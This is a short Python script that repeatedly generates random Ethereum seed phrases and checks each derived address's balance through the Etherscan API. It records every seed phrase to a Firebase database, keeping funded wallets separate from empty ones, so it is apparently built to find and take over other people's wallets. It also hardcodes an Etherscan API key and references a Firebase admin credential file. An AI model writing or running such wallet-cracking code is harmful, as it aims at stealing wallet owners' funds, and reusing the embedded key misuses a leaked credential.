from mnemonic import Mnemonic
import os
from eth_account import Account
Account.enable_unaudited_hdwallet_features()
import firebase_admin
from firebase_admin import credentials
from firebase_admin import db
import requests
import json

API_KEY = "DFRBQVTNSMYCPXRDDCN5UTRWKGK89IPX6I"

cred = credentials.Certificate("cryptoseeds-daef1-firebase-adminsdk-pz1q3-980d6ab096.json")
firebase_admin.initialize_app(cred, {'databaseURL':'https://cryptoseeds-daef1-default-rtdb.firebaseio.com/'})
ref = db.reference('zeroblance/')  
refer = db.reference('balance/')

while True:
    random_bytes = os.urandom(16)
    mnemo = Mnemonic("english")
    seed_words = mnemo.to_mnemonic(random_bytes)
    print(seed_words)
   
    with open('data.txt', 'a') as file:
        file.write('\n' + str(seed_words))
	
    try:
        acct = Account.from_mnemonic(seed_words)
        print(acct.address)
        url = f"https://api.etherscan.io/api?module=account&action=balance&address={acct.address}&tag=latest&apikey={API_KEY}"
        response = requests.get(url)
        print(response)
        if response.status_code == 200:
            data = response.json()

            if int(data['result']) !=0:
                variable = {
                    "results": data['result'],
                    "address": acct.address,
                    "seeds" : seed_words,
                }

                json_refer = json.dumps(variable)            
                refer.push({"data":json_refer})

            else:
                values = {
                    "results": data['result'],
                    "address": acct.address,
                    "seeds": seed_words,
                }

                json_string = json.dumps(values)                              
                ref.push({'data': json_string})


    except Exception as E:
        print(E)
        with open('metamaskdummy.txt', 'a') as file:
            file.write('\n' + str(E))
    
